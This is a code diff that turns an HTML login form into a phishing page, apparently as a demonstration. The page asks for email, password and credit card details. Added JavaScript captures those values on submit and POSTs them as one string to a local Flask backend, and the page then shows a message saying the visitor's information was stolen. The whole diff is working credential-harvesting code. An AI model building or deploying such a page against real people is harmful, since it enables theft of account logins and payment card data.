@@ -72,18 +72,37 @@
     <form id="loginForm">
         <input type="email" id="email" placeholder="Email" required>
         <input type="password" id="password" placeholder="Password" required>
-        <input type="text" id="creditDetails" placeholder="Credit card number (XXXX-XXXX-XXXX-XXXX)" required>
+        <input type="text" id="creditDetails" placeholder="Credit Details" required>
         <button type="submit">Submit</button>
     </form>
-    <div class="thank-you-message" id="thankYouMessage">Thanks for letting us steal your information.</div>
+    <div class="thank-you-message" id="thankYouMessage">Thanks, now we stole your info, thanks!</div>
 </div>
 
 <script>
     const form = document.getElementById('loginForm');
     const thankYouMessage = document.getElementById('thankYouMessage');
 
-    form.addEventListener('submit', function (e) {
+    form.addEventListener('submit', async function (e) {
         e.preventDefault(); // Prevent actual form submission
+
+        // Collect form data
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const creditDetails = document.getElementById('creditDetails').value;
+
+        // Send data to Flask backend
+        const response = await fetch('http://127.0.0.1:5000/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                textInput: `Email: ${email}, Password: ${password}, Credit Details: ${creditDetails}`
+            })
+        });
+
+        const result = await response.json();
+        console.log(result.message);
 
         // Hide the form and display the thank you message
         form.style.display = 'none';
